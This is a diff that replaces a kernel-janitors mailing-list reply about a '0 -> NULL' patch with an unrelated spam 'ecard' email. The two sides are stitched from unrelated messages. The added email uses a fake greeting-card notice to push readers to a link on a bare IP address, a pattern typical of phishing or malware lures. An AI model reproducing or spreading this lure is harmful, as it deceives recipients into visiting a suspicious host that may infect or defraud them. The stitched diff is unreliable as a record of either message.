@@ -1,25 +1,37 @@
-From: Jan Engelhardt <jengelh@computergmbh.de>
-Date: Tue, 24 Jul 2007 16:47:56 +0000
-Subject: Re: [PATCH] 0 -> NULL, drivers/usb/gadget/
-Message-Id: <Pine.LNX.4.64.0707241847460.18990@fbirervta.pbzchgretzou.qr>
+From: "postcard.com" <lnbvy@ca.mbe.com>
+Date: Wed, 11 Jul 2007 12:12:53 +0000
+Subject: [KJ] You've received an ecard from a Worshipper!
+Message-Id: <002301c7c3b4$cf0c7c20$c82c7de0@nurk.hpy>
 List-Id: <kernel-janitors.vger.kernel.org>
-References: <874pjvgju0.fsf@wanadoo.fr>
-In-Reply-To: <874pjvgju0.fsf@wanadoo.fr>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
-To: Yoann Padioleau <padator@wanadoo.fr>
-Cc: kernel-janitors@vger.kernel.org, akpm@linux-foundation.org, linux-kernel@vger.kernel.org
+To: kernel-janitors@vger.kernel.org
 
+Hi. Worshipper has sent you an ecard.
+See your card as often as you wish during the next 15 days.
 
-On Jul 23 2007 18:34, Yoann Padioleau wrote:
->
->PS: I have performed the same transformation on the whole kernel
->and it affects around 300 files. I will send the remaining patches
->if you are interested in.
+SEEING YOUR CARD
 
-Don't hold off :)
+If your email software creates links to Web pages, click on your 
+card's direct www address below while you are connected to the Internet:
 
+http://67.175.236.82/?ee713076a3db573383e1a7a859
 
-	Jan
--- 
+Or copy and paste it into your browser's "Location" box (where Internet 
+addresses go).
+
+We hope you enjoy your awesome card.
+
+Wishing you the best,
+Webmaster,
+postcard.com
+
+_______________________________________________
+REMINDER: this mailing list moved to vger.kernel.org and current one will be discontinued soon.
+To resubscribe, send email to majordomo@vger.kernel.org with
+&quot;subscribe kernel-janitors&quot; in message body and follow instructions.
+
+Kernel-janitors mailing list
+Kernel-janitors@lists.linux-foundation.org
+https://lists.linux-foundation.org/mailman/listinfo/kernel-janitors
